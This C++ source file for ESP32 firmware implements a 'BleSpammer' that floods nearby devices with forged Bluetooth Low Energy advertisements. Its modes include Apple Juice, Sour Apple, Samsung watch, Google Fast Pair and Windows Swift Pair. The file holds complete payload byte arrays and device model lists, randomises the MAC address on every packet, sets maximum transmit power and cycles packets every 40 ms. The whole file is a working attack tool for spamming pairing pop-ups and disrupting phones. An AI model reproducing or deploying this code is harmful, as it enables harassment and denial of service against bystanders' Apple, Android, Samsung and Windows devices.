#include "BleSpammer.h"
#include "App.h"
#include "Logger.h"
#include <esp_mac.h> // For esp_base_mac_addr_set
#include <esp_bt.h>  // For esp_ble_tx_power_set

// Maximum BLE transmit power for ESP32-S3
#define MAX_TX_POWER ESP_PWR_LVL_P21

// --- Payload Data (from reference code) ---

// AppleJuice Payload Data
static const uint8_t IOS1[]{
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 
    0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16,
};

static const uint8_t IOS2[]{
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 
    0x02, 0x1e, 0x24,
};

// Google Fast Pair Models from https://github.com/Flipper-XFW/Xtreme-Apps
struct DeviceType {
    uint32_t value;
};
static const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x000009}, {0x090000},
    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7},
    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
    {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000}, {0xF00001}, {0xF00201}, {0xF00209},
    {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452},
    {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C},
    {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, {0x0660D7}, {0x0103F0},
    {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
};

// Samsung Watch Models
struct WatchModel { uint8_t value; };
static const WatchModel watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
    {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
    {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};

BleSpammer::BleSpammer() : 
    app_(nullptr), 
    isActive_(false), 
    currentMode_(BleSpamMode::ALL),
    currentSubMode_(BleSpamMode::APPLE_JUICE),
    lastPacketTime_(0)
{}

void BleSpammer::setup(App* app) {
    app_ = app;
}

void BleSpammer::start(BleSpamMode mode) {
    if (isActive_) return;
    
    // --- THIS IS THE FIX ---
    // DO NOT call requestHostControl or init the stack. 
    // The BLE stack is assumed to be initialized by the system when needed.
    // If the Ducky keyboard was used, the stack is already on. If not, this will fail gracefully.
    // The BLE stack is now managed by BleManager.
    // We assume it is initialized when this is called.
    
    // Set power level every time to be sure
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    LOG(LogLevel::INFO, "BLESPAM", "Starting BLE Spam Mode: %d", (int)mode);
    isActive_ = true;
    currentMode_ = mode;
    currentSubMode_ = BleSpamMode::APPLE_JUICE; 
    lastPacketTime_ = 0;
}

void BleSpammer::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BLESPAM", "Stopping BLE Spam.");
    isActive_ = false;

    // Stop advertising if it's running
    if(NimBLEDevice::getAdvertising() && NimBLEDevice::getAdvertising()->isAdvertising()) {
      NimBLEDevice::getAdvertising()->stop();
    }

    // --- THIS IS THE FIX ---
    // DO NOT release host control or deinit the stack. Let the manager handle it.
}

void BleSpammer::loop() {
    if (!isActive_) return;

    if (millis() - lastPacketTime_ > 40) {
        executeSpamPacket();
        lastPacketTime_ = millis();
    }
}


void BleSpammer::executeSpamPacket() {
    // --- REFACTORED: No more init() or deinit() in the loop ---
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    // --- THIS IS THE FIX: Revert to the low-level ESP-IDF call ---
    esp_base_mac_addr_set(macAddr);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if (!pAdvertising) return; // Safety check
    
    BleSpamMode modeToSpam = currentMode_;
    if (modeToSpam == BleSpamMode::ALL) {
        // Cycle through modes for 'ALL'
        modeToSpam = currentSubMode_;
        currentSubMode_ = static_cast<BleSpamMode>((static_cast<int>(currentSubMode_) + 1));
        // If we've cycled past the last real mode, loop back to the first one.
        if (currentSubMode_ >= BleSpamMode::ALL) {
            currentSubMode_ = BleSpamMode::APPLE_JUICE;
        }
    }

    NimBLEAdvertisementData advertisementData = getAdvertisementData(modeToSpam);
    pAdvertising->setAdvertisementData(advertisementData);
    
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS); // Let advertisement run briefly
    pAdvertising->stop();
}


NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
    NimBLEAdvertisementData adData;

    switch (type) {
        case BleSpamMode::MICROSOFT: {
            const char* name = generateRandomName();
            size_t name_length = strlen(name);
            uint8_t packet[7 + name_length];
            uint8_t i = 0;
            packet[i++] = 6 + name_length; // Size
            packet[i++] = 0xFF;
            packet[i++] = 0x06;
            packet[i++] = 0x00;
            packet[i++] = 0x03;
            packet[i++] = 0x00;
            packet[i++] = 0x80;
            memcpy(&packet[i], name, name_length);
            adData.addData(std::string((char *)packet, 7 + name_length));
            break;
        }
        case BleSpamMode::APPLE_JUICE: {
            if (random(2) == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                adData.addData(std::string((char *)packet, 31));
            } else {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                adData.addData(std::string((char *)packet, 23));
            }
            break;
        }
        case BleSpamMode::SOUR_APPLE: {
            uint8_t packet[17];
            uint8_t i = 0;
            packet[i++] = 16;   // Packet Length
            packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
            packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
            packet[i++] = 0x00; // ...
            packet[i++] = 0x0F; // Type
            packet[i++] = 0x05; // Length
            packet[i++] = 0xC1; // Action Flags
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[i++] = types[random() % sizeof(types)]; // Action Type
            esp_fill_random(&packet[i], 3);                // Authentication Tag
            i += 3;
            packet[i++] = 0x00; // ???
            packet[i++] = 0x00; // ???
            packet[i++] = 0x10; // Type ???
            esp_fill_random(&packet[i], 3);
            adData.addData(std::string((char *)packet, 17));
            break;
        }
        case BleSpamMode::SAMSUNG: {
            uint8_t model = watch_models[random(sizeof(watch_models)/sizeof(watch_models[0]))].value;
            uint8_t packet[15] = {
                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
                0xFF, 0x00, 0x00, 0x43, model
            };
            adData.addData(std::string((char *)packet, 15));
            break;
        }
        case BleSpamMode::GOOGLE: {
            const uint32_t model = android_models[random(sizeof(android_models)/sizeof(android_models[0]))].value;
            uint8_t packet[14] = {
                0x03, 0x03, 0x2C, 0xFE,
                0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
            };
            adData.addData(std::string((char *)packet, 14));
            break;
        }
        default:
            break;
    }
    return adData;
}

void BleSpammer::generateRandomMac(uint8_t* mac) {
    esp_fill_random(mac, 6);
    mac[0] |= 0xC0; // Set MAC to random static
}

const char* BleSpammer::generateRandomName() {
    static char randomName[11];
    const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = rand() % 10 + 1;
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % (strlen(charset) - 1)];
    }
    randomName[len] = '\0';
    return randomName;
}

bool BleSpammer::isActive() const { return isActive_; }

const char* BleSpammer::getModeString() const {
    BleSpamMode mode = (currentMode_ == BleSpamMode::ALL) ? currentSubMode_ : currentMode_;
    switch (mode) {
        case BleSpamMode::APPLE_JUICE:  return "Apple Juice";
        case BleSpamMode::SOUR_APPLE:   return "Sour Apple";
        case BleSpamMode::SAMSUNG:      return "Samsung Spam";
        case BleSpamMode::GOOGLE:       return "Android Fast Pair";
        case BleSpamMode::MICROSOFT:    return "Windows Swift Pair";
        case BleSpamMode::ALL:          return "Tutti-Frutti";
        default:                        return "BLE Spam";
    }
}